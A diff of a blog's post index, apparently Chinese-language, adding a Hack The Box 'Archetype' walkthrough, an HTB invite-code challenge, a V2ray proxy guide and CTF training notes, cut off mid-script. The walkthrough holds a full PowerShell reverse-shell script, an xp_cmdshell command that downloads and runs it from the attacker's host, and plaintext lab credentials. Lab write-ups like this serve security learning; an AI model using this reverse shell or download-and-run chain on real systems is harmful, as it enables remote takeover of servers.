@@ -243,6 +243,103 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB-Archetype WriteUp</title>
+    <url>/2021/04/13/HTB-Archetype%20WriteUp/</url>
+    <content><![CDATA[<h2 id="HTB-Archetype-WriteUp"><a href="#HTB-Archetype-WriteUp" class="headerlink" title="HTB-Archetype WriteUp"></a>HTB-Archetype WriteUp</h2><h3 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h3><p><code>nmap -sV -sC 10.10.10.27</code></p>
+<img src="/images/20210313210153.png" style="zoom:67%;" />
+
+<p>根据上图扫描结果，靶机开放了135、139、445、1433端口</p>
+<ul>
+<li><p>135端口为RPC，可以进行口令爆破</p>
+</li>
+<li><p>139端口为NetBIOS</p>
+</li>
+<li><p>445端口为SMB文件共享</p>
+</li>
+<li><p>1433端口与SQL服务有关</p>
+</li>
+</ul>
+<h3 id="445端口SMB文件共享"><a href="#445端口SMB文件共享" class="headerlink" title="445端口SMB文件共享"></a>445端口SMB文件共享</h3><p>先查看SMB的共享文件</p>
+<p><code>smbclient -L 10.10.10.27</code></p>
+<img src="/images/20210313204721.png" style="zoom:67%;" />
+
+<p>smb要求输入密码，但是直接按回车之后，也可以看到共享列表</p>
+<p>在图中可以看到backups为共享的对象为全体，直接访问backups文件夹</p>
+<p><code>smbclient //10.10.10.27/backups</code></p>
+<p>回车</p>
+<p>然后用<code>ls</code>查看backups文件内容</p>
+<p>用<code>get</code>获取prod.dtsConfig文件</p>
+<img src="/images/20210313205904.png" style="zoom: 67%;" />
+
+<p>prod.dtsConfig文件就下载到了我们服务器中</p>
+<img src="/images/20210313212722.png" style="zoom:67%;" />
+
+<p>在prod.dtsConfig文件中，可以找sql的User ID和Password</p>
+<p>SQL Server的身份验证方式有两种：操作系统身份验证和数据库身份验证</p>
+<p>这里的参数值是操作系统身份验证方式，ARCHETYPE为主机名，sql_svc为登录数据库的操作系统用户名</p>
+<h3 id="mssqlclient登入数据库执行脚本"><a href="#mssqlclient登入数据库执行脚本" class="headerlink" title="mssqlclient登入数据库执行脚本"></a>mssqlclient登入数据库执行脚本</h3><p>这边需要下载impacket工具</p>
+<p><code>git clone https://github.com/SecureAuthCorp/impacket</code></p>
+<p><code>cd impacket</code></p>
+<p><code>python3 setup.py install</code></p>
+<p>然后利用mssqlclient和获取到的账号密码登入数据库</p>
+<p><code>mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code></p>
+<p><code>M3g4c0rp123</code></p>
+<img src="/images/Lily_Screenshot_1615812452.png" style="zoom:67%;" />
+
+<p>登入成功之后，我们需要测试一下该账号是否具有最高的sysadmin权限</p>
+<p><code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code></p>
+<img src="/images/image-20210315205958962.png" style="zoom: 67%;" />
+
+<p>结果显示，该账号确实具有sysadmin的权限，接下来启用xp_cmdshell获得RCE并反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;Show Advanced Options&#x27;, 1; </span><br><span class="line">reconfigure; </span><br><span class="line">sp_configure;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">xp_cmdshell &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p>其中执行whoami的结果显示如下</p>
+<img src="/images/image-20210315213821244.png" style="zoom:67%;" />
+
+<p>说明该账户在SQL服务中具有archetype\sql_svc，但是在host上不具有任何权限</p>
+<p>创建一个shell.ps1脚本，内容如下</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.xx.xx.x&quot;</span>,xxx);<span class="variable">$stream</span> =<span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">065535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> =<span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> |<span class="built_in">Out-String</span> );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;# &quot;</span>;<span class="variable">$sendbyte</span> =([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure>
+
+<p>查一下本地ip地址</p>
+<p><code>ifconfig tun0</code></p>
+<p>得知本机在局域网内的ip为10.10.16.10</p>
+<p>修改shell.ps1脚本内ip内容为10.10.16.10，端口为443</p>
+<p>然后在shell.ps1脚本存在的文件夹下运行http服务，因为80端口有服务运行，选择在81端口上运行</p>
+<p><code>python3 -m http.server 81</code></p>
+<p>然后去另一个窗口运行nc，等待10.10.10.27的连接</p>
+<p><code>nc -nlvp 443</code></p>
+<p>接下来进sql窗口执行下列命令</p>
+<p><code>xp_cmdshell &quot;Powershell &quot; IEX(New-Object Net.WebClient).DownloadString(\&quot;http://10.10.16.10:81/shell.ps1\&quot;);&quot;</code></p>
+<p>在http和nc窗口同时得到反馈</p>
+<p><img src="/images/image-20210413221428797.png"></p>
+<p>在<code>\user\sql_svc\desktop</code>下获取user.txt</p>
+<img src="/images/image-20210413214419239.png" style="zoom:67%;" />
+
+<p>得到user flag <code>3e7b102e78218e935bf3f4951fec21a3</code></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>前面得到的只是普通用户的账号，接下来可以通过type指令查看Powershell的历史记录文件</p>
+<p><code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p>
+<p><img src="/images/image-20210413215004497.png"></p>
+<p>这表示backups对管理员账号进行了映射，我们可以用psexec.py来取得管理员权限</p>
+<p>接下来用管理员账号<code>administrator</code>和密码<code>MEGACORP_4dm1n!!</code>进行登入</p>
+<p><img src="/images/image-20210413221145501.png"></p>
+<p>进入到管理员桌面，取得root.txt</p>
+<img src="/images/image-20210413215944832.png" style="zoom:50%;" />
+
+<p>提交flag<code>b91ccec3305e98240082d4474b848528</code>，完成Archetype机器</p>
+]]></content>
+      <categories>
+        <category>HTB</category>
+        <category>Hacker</category>
+        <category>Security</category>
+        <category>Penetration testing</category>
+      </categories>
+      <tags>
+        <tag>Study life</tag>
+        <tag>HTB</tag>
+        <tag>Penetration testing</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB VPN配置</title>
     <url>/2021/03/13/HTB-VPN%E9%85%8D%E7%BD%AE/</url>
     <content><![CDATA[<h3 id="HTB-VPN配置"><a href="#HTB-VPN配置" class="headerlink" title="HTB VPN配置"></a>HTB VPN配置</h3><p>服务器： 阿里云 ubuntu</p>
@@ -346,6 +443,101 @@
       </tags>
   </entry>
   <entry>
+    <title>HacktheBox注册挑战</title>
+    <url>/2021/03/13/HacktheBox%E6%B3%A8%E5%86%8C%E6%8C%91%E6%88%98/</url>
+    <content><![CDATA[<h3 id="HacktheBox注册挑战"><a href="#HacktheBox注册挑战" class="headerlink" title="HacktheBox注册挑战"></a>HacktheBox注册挑战</h3><p>HacktheBox是一个在线靶场，近期准备考OSCP，准备拿靶场练练手。</p>
+<p>HacktheBox的注册有一定的门槛，在这里记录一下解决过程。</p>
+<p><img src="/images/20210313162402.png" alt="注册页面1"></p>
+<p>点击HACK YOUR WAY IN</p>
+<p><img src="/images/20210313162502.png" alt="注册页面2"></p>
+<p>在注册页面首先需要输入code，我们先看hint，点击Click Here</p>
+<p><img src="/images/20210313162644.png" alt="注册码线索"></p>
+<p>提示我们需要检测console</p>
+<p>打开控制台，看到这样的信息</p>
+<img src="/images/20210313162823.png" alt="console信息" style="zoom: 67%;" />
+
+<p>提示我们需要找一个有趣的js文件，进入sources下的page查看调用的js文件，找到一个带有注释的js，提示我们这个js可能被混淆了</p>
+<img src="/images/20210313163055.png" alt="js文件" style="zoom:67%;" />
+
+<p>这个js的内容为eval类型的混淆，经过代码格式化后，eval中function的内容如下</p>
+<img src="/images/20210313163251.png" alt="js中function代码" style="zoom:50%;" />
+
+<p>包含6个参数，并且给了参数的内容</p>
+<p>这边给出两种解混淆的方案</p>
+<ul>
+<li>直接查找反混淆网站，因为是eval类型，反混淆比较容易<ul>
+<li>eval类型的js反混淆网站：<a href="https://www.bm8.com.cn/jsConfusion/">https://www.bm8.com.cn/jsConfusion/</a></li>
+</ul>
+</li>
+<li>vs运行一遍，在最后return p的地方下一个断点，直接查看p的内容<ul>
+<li><img src="/images/20210313171250.png" alt="vs调试"></li>
+</ul>
+</li>
+</ul>
+<p>最后得到eval的执行内容</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">makeInviteCode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;/api/invite/how/to/generate&#x27;</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(a)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(a)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据执行内容要求我们用POST访问&#x2F;api&#x2F;invite&#x2F;how&#x2F;to&#x2F;generate</p>
+<p>用hackbar执行（或者postman）</p>
+<img src="/images/20210313164219.png" alt="how-to-generate" style="zoom: 67%;" />
+
+<p>得到如图json内容，该内容可能会改变为ROT13解密方式，但结果应该是一致的</p>
+<p>复制data内容，用hackbar解base64内容</p>
+<img src="/images/20210313164520.png" alt="hackbar解base64" style="zoom:67%;" />
+
+<p>提示我们需要再用post访问&#x2F;api&#x2F;invite&#x2F;generate</p>
+<p>访问获取json内容为</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/20210313164702.png" alt="注册码code1"></p>
+<p>很容易看出这是base64，重复上述操作，用hackbar解密base64内容得到注册码（该注册码是动态变化的）</p>
+<p><code>JBIXF-QDULC-CEBFM-OTBAW-DKHYP</code></p>
+<p>填入之后就可以注册了</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Hacker</category>
+        <category>Security</category>
+      </categories>
+      <tags>
+        <tag>Study life</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux服务器利用V2ray访问外网（命令行）</title>
+    <url>/2021/12/10/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%88%A9%E7%94%A8V2ray%E8%AE%BF%E9%97%AE%E5%A4%96%E7%BD%91%EF%BC%88%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="Linux服务器利用V2ray访问外网（命令行）"><a href="#Linux服务器利用V2ray访问外网（命令行）" class="headerlink" title="Linux服务器利用V2ray访问外网（命令行）"></a>Linux服务器利用V2ray访问外网（命令行）</h2><h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>在用go-cqhttp+flask框架实现自定义QQ机器人功能时，想要利用爬虫获取TG机器人的相关发布内容，面临的首个问题就是服务器需要访问外网。</p>
+<p>我手上有很多外网的代理链接，但是很可惜的是这些并不是我自己的VPS服务器；且在我本身linux服务器不带用图形界面，因此无法使用ssr和v2rayN等简洁的代理服务。</p>
+<p>因此，如何在只有命令行的条件下将已有的代理链接变成v2ray客户端配置并访问外网即是本文的主要内容。</p>
+<h3 id="0x01-实现过程"><a href="#0x01-实现过程" class="headerlink" title="0x01 实现过程"></a>0x01 实现过程</h3><p>选择一个已有的代理，获取V2ray的订阅链接。</p>
+<p>这个链接是一个订阅的url，直接在浏览器输入后，即可下载订阅链接的txt文件。</p>
+<p>打开之后是一个base64编码的内容，直接解码。</p>
+<p><img src="/images/image-20211205225346933.png" alt="image-20211205225346933"></p>
+<p>可以看到有vmess:&#x2F;&#x2F;开头的base64内容，如果选择继续解码，你会得到一个json字段，如图。</p>
+<p><img src="/images/image-20211205225721126.png" alt="image-20211205225721126"></p>
+<p>用这些字段确实可以根据v2ray客户端配置的格式补充得到配置文件，但是过于麻烦。</p>
+<p>我们直接将vmess:&#x2F;&#x2F;的内容复制到windows上的v2rayN里面，然后选择“导出所选服务器为服务端配置”。</p>
+<p><img src="/images/image-20211205230049835.png" alt="image-20211205230049835"></p>
+<p>然后将这个配置文件上传到我们的linux服务器上即可，启动时带上-config参数导入配置文件。（linux的V2ray相关配置可以看之前的文章）</p>
+<p><code>v2ray -config /usr/local/etc/v2ray/v2ray.json </code></p>
+<p><img src="/images/image-20211205230342197.png" alt="image-20211205230342197"></p>
+<p>可以看到V2ray已经正常启动。</p>
+<p>接下来需要在另一个命令行窗口中将流量转发到1080端口即可实现代理，输入命令行。</p>
+<p><code>export http_proxy=&quot;socks5://127.0.0.1:1080&quot;</code></p>
+<p><code>export https_proxy=&quot;socks5://127.0.0.1:1080&quot;</code></p>
+<blockquote>
+<p>注意：该代理只作用在当前终端窗口，不会影响服务器环境</p>
+</blockquote>
+<h3 id="0x02-效果"><a href="#0x02-效果" class="headerlink" title="0x02 效果"></a>0x02 效果</h3><p><img src="/images/image-20211205231153326.png" alt="image-20211205231153326"></p>
+<p>命令行代理已经实现，接下来即可开始实现TG爬虫功能了</p>
+]]></content>
+      <categories>
+        <category>Daily</category>
+      </categories>
+      <tags>
+        <tag>Daily life</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>NeSE丙队1月月赛训练</title>
     <url>/2021/01/22/NeSE%E4%B8%99%E9%98%9F1%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%AD%E7%BB%83/</url>
     <content><![CDATA[<h2 id="Solved"><a href="#Solved" class="headerlink" title="Solved"></a>Solved</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x00-misc1"><a href="#0x00-misc1" class="headerlink" title="0x00 misc1"></a>0x00 misc1</h4><p>签到题</p>
@@ -394,145 +586,13 @@
 <h4 id="0x07-ez-cypto"><a href="#0x07-ez-cypto" class="headerlink" title="0x07 ez_cypto"></a>0x07 ez_cypto</h4><p>挺离谱的，RSA共模攻击，求出m&#x3D;512347890123，提示flag为后9位，我也挺想知道flag是啥的</p>
 ]]></content>
       <categories>
-        <category>Hacker</category>
         <category>CTF</category>
+        <category>Hacker</category>
         <category>Security</category>
       </categories>
       <tags>
         <tag>CTF</tag>
         <tag>NeSE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux服务器利用V2ray访问外网（命令行）</title>
-    <url>/2021/12/10/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%88%A9%E7%94%A8V2ray%E8%AE%BF%E9%97%AE%E5%A4%96%E7%BD%91%EF%BC%88%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="Linux服务器利用V2ray访问外网（命令行）"><a href="#Linux服务器利用V2ray访问外网（命令行）" class="headerlink" title="Linux服务器利用V2ray访问外网（命令行）"></a>Linux服务器利用V2ray访问外网（命令行）</h2><h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>在用go-cqhttp+flask框架实现自定义QQ机器人功能时，想要利用爬虫获取TG机器人的相关发布内容，面临的首个问题就是服务器需要访问外网。</p>
-<p>我手上有很多外网的代理链接，但是很可惜的是这些并不是我自己的VPS服务器；且在我本身linux服务器不带用图形界面，因此无法使用ssr和v2rayN等简洁的代理服务。</p>
-<p>因此，如何在只有命令行的条件下将已有的代理链接变成v2ray客户端配置并访问外网即是本文的主要内容。</p>
-<h3 id="0x01-实现过程"><a href="#0x01-实现过程" class="headerlink" title="0x01 实现过程"></a>0x01 实现过程</h3><p>选择一个已有的代理，获取V2ray的订阅链接。</p>
-<p>这个链接是一个订阅的url，直接在浏览器输入后，即可下载订阅链接的txt文件。</p>
-<p>打开之后是一个base64编码的内容，直接解码。</p>
-<p><img src="/images/image-20211205225346933.png" alt="image-20211205225346933"></p>
-<p>可以看到有vmess:&#x2F;&#x2F;开头的base64内容，如果选择继续解码，你会得到一个json字段，如图。</p>
-<p><img src="/images/image-20211205225721126.png" alt="image-20211205225721126"></p>
-<p>用这些字段确实可以根据v2ray客户端配置的格式补充得到配置文件，但是过于麻烦。</p>
-<p>我们直接将vmess:&#x2F;&#x2F;的内容复制到windows上的v2rayN里面，然后选择“导出所选服务器为服务端配置”。</p>
-<p><img src="/images/image-20211205230049835.png" alt="image-20211205230049835"></p>
-<p>然后将这个配置文件上传到我们的linux服务器上即可，启动时带上-config参数导入配置文件。（linux的V2ray相关配置可以看之前的文章）</p>
-<p><code>v2ray -config /usr/local/etc/v2ray/v2ray.json </code></p>
-<p><img src="/images/image-20211205230342197.png" alt="image-20211205230342197"></p>
-<p>可以看到V2ray已经正常启动。</p>
-<p>接下来需要在另一个命令行窗口中将流量转发到1080端口即可实现代理，输入命令行。</p>
-<p><code>export http_proxy=&quot;socks5://127.0.0.1:1080&quot;</code></p>
-<p><code>export https_proxy=&quot;socks5://127.0.0.1:1080&quot;</code></p>
-<blockquote>
-<p>注意：该代理只作用在当前终端窗口，不会影响服务器环境</p>
-</blockquote>
-<h3 id="0x02-效果"><a href="#0x02-效果" class="headerlink" title="0x02 效果"></a>0x02 效果</h3><p><img src="/images/image-20211205231153326.png" alt="image-20211205231153326"></p>
-<p>命令行代理已经实现，接下来即可开始实现TG爬虫功能了</p>
-]]></content>
-      <categories>
-        <category>Daily</category>
-      </categories>
-      <tags>
-        <tag>Daily life</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTB-Archetype WriteUp</title>
-    <url>/2021/04/13/HTB-Archetype%20WriteUp/</url>
-    <content><![CDATA[<h2 id="HTB-Archetype-WriteUp"><a href="#HTB-Archetype-WriteUp" class="headerlink" title="HTB-Archetype WriteUp"></a>HTB-Archetype WriteUp</h2><h3 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h3><p><code>nmap -sV -sC 10.10.10.27</code></p>
-<img src="/images/20210313210153.png" style="zoom:67%;" />
-
-<p>根据上图扫描结果，靶机开放了135、139、445、1433端口</p>
-<ul>
-<li><p>135端口为RPC，可以进行口令爆破</p>
-</li>
-<li><p>139端口为NetBIOS</p>
-</li>
-<li><p>445端口为SMB文件共享</p>
-</li>
-<li><p>1433端口与SQL服务有关</p>
-</li>
-</ul>
-<h3 id="445端口SMB文件共享"><a href="#445端口SMB文件共享" class="headerlink" title="445端口SMB文件共享"></a>445端口SMB文件共享</h3><p>先查看SMB的共享文件</p>
-<p><code>smbclient -L 10.10.10.27</code></p>
-<img src="/images/20210313204721.png" style="zoom:67%;" />
-
-<p>smb要求输入密码，但是直接按回车之后，也可以看到共享列表</p>
-<p>在图中可以看到backups为共享的对象为全体，直接访问backups文件夹</p>
-<p><code>smbclient //10.10.10.27/backups</code></p>
-<p>回车</p>
-<p>然后用<code>ls</code>查看backups文件内容</p>
-<p>用<code>get</code>获取prod.dtsConfig文件</p>
-<img src="/images/20210313205904.png" style="zoom: 67%;" />
-
-<p>prod.dtsConfig文件就下载到了我们服务器中</p>
-<img src="/images/20210313212722.png" style="zoom:67%;" />
-
-<p>在prod.dtsConfig文件中，可以找sql的User ID和Password</p>
-<p>SQL Server的身份验证方式有两种：操作系统身份验证和数据库身份验证</p>
-<p>这里的参数值是操作系统身份验证方式，ARCHETYPE为主机名，sql_svc为登录数据库的操作系统用户名</p>
-<h3 id="mssqlclient登入数据库执行脚本"><a href="#mssqlclient登入数据库执行脚本" class="headerlink" title="mssqlclient登入数据库执行脚本"></a>mssqlclient登入数据库执行脚本</h3><p>这边需要下载impacket工具</p>
-<p><code>git clone https://github.com/SecureAuthCorp/impacket</code></p>
-<p><code>cd impacket</code></p>
-<p><code>python3 setup.py install</code></p>
-<p>然后利用mssqlclient和获取到的账号密码登入数据库</p>
-<p><code>mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code></p>
-<p><code>M3g4c0rp123</code></p>
-<img src="/images/Lily_Screenshot_1615812452.png" style="zoom:67%;" />
-
-<p>登入成功之后，我们需要测试一下该账号是否具有最高的sysadmin权限</p>
-<p><code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code></p>
-<img src="/images/image-20210315205958962.png" style="zoom: 67%;" />
-
-<p>结果显示，该账号确实具有sysadmin的权限，接下来启用xp_cmdshell获得RCE并反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;Show Advanced Options&#x27;, 1; </span><br><span class="line">reconfigure; </span><br><span class="line">sp_configure;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">xp_cmdshell &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
-
-<p>其中执行whoami的结果显示如下</p>
-<img src="/images/image-20210315213821244.png" style="zoom:67%;" />
-
-<p>说明该账户在SQL服务中具有archetype\sql_svc，但是在host上不具有任何权限</p>
-<p>创建一个shell.ps1脚本，内容如下</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.xx.xx.x&quot;</span>,xxx);<span class="variable">$stream</span> =<span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">065535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> =<span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> |<span class="built_in">Out-String</span> );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;# &quot;</span>;<span class="variable">$sendbyte</span> =([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure>
-
-<p>查一下本地ip地址</p>
-<p><code>ifconfig tun0</code></p>
-<p>得知本机在局域网内的ip为10.10.16.10</p>
-<p>修改shell.ps1脚本内ip内容为10.10.16.10，端口为443</p>
-<p>然后在shell.ps1脚本存在的文件夹下运行http服务，因为80端口有服务运行，选择在81端口上运行</p>
-<p><code>python3 -m http.server 81</code></p>
-<p>然后去另一个窗口运行nc，等待10.10.10.27的连接</p>
-<p><code>nc -nlvp 443</code></p>
-<p>接下来进sql窗口执行下列命令</p>
-<p><code>xp_cmdshell &quot;Powershell &quot; IEX(New-Object Net.WebClient).DownloadString(\&quot;http://10.10.16.10:81/shell.ps1\&quot;);&quot;</code></p>
-<p>在http和nc窗口同时得到反馈</p>
-<p><img src="/images/image-20210413221428797.png"></p>
-<p>在<code>\user\sql_svc\desktop</code>下获取user.txt</p>
-<img src="/images/image-20210413214419239.png" style="zoom:67%;" />
-
-<p>得到user flag <code>3e7b102e78218e935bf3f4951fec21a3</code></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>前面得到的只是普通用户的账号，接下来可以通过type指令查看Powershell的历史记录文件</p>
-<p><code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p>
-<p><img src="/images/image-20210413215004497.png"></p>
-<p>这表示backups对管理员账号进行了映射，我们可以用psexec.py来取得管理员权限</p>
-<p>接下来用管理员账号<code>administrator</code>和密码<code>MEGACORP_4dm1n!!</code>进行登入</p>
-<p><img src="/images/image-20210413221145501.png"></p>
-<p>进入到管理员桌面，取得root.txt</p>
-<img src="/images/image-20210413215944832.png" style="zoom:50%;" />
-
-<p>提交flag<code>b91ccec3305e98240082d4474b848528</code>，完成Archetype机器</p>
-]]></content>
-      <categories>
-        <category>HTB</category>
-        <category>Hacker</category>
-        <category>Security</category>
-        <category>Penetration testing</category>
-      </categories>
-      <tags>
-        <tag>Study life</tag>
-        <tag>HTB</tag>
-        <tag>Penetration testing</tag>
       </tags>
   </entry>
   <entry>
@@ -672,8 +732,63 @@
 <p>因此，得到<code>flag&#123;sssdddwwwddddddsssaaaw&#125;</code></p>
 ]]></content>
       <categories>
-        <category>Hacker</category>
         <category>CTF</category>
+        <category>Hacker</category>
+        <category>Security</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>NeSE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NeSE丙队5月月赛训练</title>
+    <url>/2021/05/29/NeSE%E4%B8%99%E9%98%9F5%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%AD%E7%BB%83/</url>
+    <content><![CDATA[<h2 id="Solved"><a href="#Solved" class="headerlink" title="Solved"></a>Solved</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x00-嗷呜"><a href="#0x00-嗷呜" class="headerlink" title="0x00 嗷呜"></a>0x00 嗷呜</h4><p>简单查一下，兽音加密，直接 <a href="https://roar.iiilab.com/">https://roar.iiilab.com/</a> 输入内容，得到一串01数组</p>
+<p>01数组共841位，简单的29*29，估计是二维码，简单处理一下</p>
+<p>代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">from zlib import *</span><br><span class="line"></span><br><span class="line">MAX = 29</span><br><span class="line">pic = Image.new(&quot;RGB&quot;,(MAX,MAX))</span><br><span class="line">str =&quot;1111111011000110100000111111110000010010001110001001000001101110100101101001001010111011011101010100000001000101110110111010101000000110001011101100000101011100010110010000011111111010101010101010111111100000000100001011101100000000100010111010010001011111110010111110011000110101001011010101000010001010001110000101101001001000110001001100001010010111101001111111110101010000000111101101100000000101011001110111101101011100000000011011001000100101101110010110101100001010100111000101010000011110101001000011011000011101010010111001001000111011000110100011000000100100111101111010111100101000011110101111110100000000010010000011010001010111111110110011110010101011001100000100100010110011000110001011101011101100000111111010110111010011001101011110000010101110100001001011000100011111000001000001000011111100101111111110110010111011110101010&quot;</span><br><span class="line"></span><br><span class="line">i=0</span><br><span class="line">for y in range(0,MAX):</span><br><span class="line">    for x in range(0,MAX):</span><br><span class="line">        if(str[i] == &#x27;1&#x27;):</span><br><span class="line">            pic.putpixel([x,y],(0,0,0))</span><br><span class="line">        else:pic.putpixel([x,y],(255,255,255))</span><br><span class="line">        i = i+1</span><br><span class="line">pic.show()</span><br><span class="line">pic.save(&quot;flag.png&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/qpQNZDAvgS82I8ZQZ730rA.png"></p>
+<p>flag{we_mia0_mia0_t0gether}</p>
+<h4 id="0x01-crypto-0range"><a href="#0x01-crypto-0range" class="headerlink" title="0x01 crypto_0range"></a>0x01 crypto_0range</h4><p>过于简单的签到题</p>
+<p>base64解第一行：523641</p>
+<p>第二行看前6位出现flag{的标志，直接重新排序即可得到flag{crypto_is_magical!}</p>
+<h4 id="0X02-ultra-combine"><a href="#0X02-ultra-combine" class="headerlink" title="0X02 ultra_combine"></a>0X02 ultra_combine</h4><p>1.png 无法打开，但是可以直接用Stegsolve.jar查看，文件长宽500*359，CRC32值为0x2ca75026，直接上代码爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">misc = open(&quot;1.png&quot;,&quot;rb&quot;).read()</span><br><span class="line"></span><br><span class="line"># 爆破宽</span><br><span class="line">for i in range(1024):</span><br><span class="line">	data = misc[12:16] + struct.pack(&#x27;&gt;i&#x27;,i)+ misc[20:29]  #IHDR数据</span><br><span class="line">	crc32 = binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">	if crc32 == 0x2ca75026: #IHDR块的crc32值</span><br><span class="line">		print(i)</span><br><span class="line">		print(&quot;hex:&quot;+hex(i))</span><br><span class="line"></span><br><span class="line"># 爆破高		</span><br><span class="line">for i in range(1024):</span><br><span class="line">    data = misc[12:20] + 